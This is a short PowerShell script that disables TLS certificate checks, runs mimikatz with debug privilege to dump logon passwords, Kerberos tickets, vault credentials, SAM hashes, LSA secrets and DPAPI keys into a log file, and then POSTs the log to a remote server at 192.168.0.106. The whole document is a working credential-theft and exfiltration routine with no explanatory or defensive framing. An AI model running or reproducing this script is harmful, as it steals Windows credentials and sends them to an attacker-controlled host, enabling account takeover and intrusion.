[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}

.\mimikatz.exe "privilege::debug" "log" "sekurlsa::logonpasswords" "sekurlsa::tickets" "vault::cred" "lsadump::sam" "lsadump::secrets" "sekurlsa::ekeys" "kerberos::tgt" "sekurlsa::dpapi" "exit"
$body = Get-Content mimikatz.log | Out-String
Invoke-WebRequest -Uri https://192.168.0.106/post.php -Method POST -Body $body
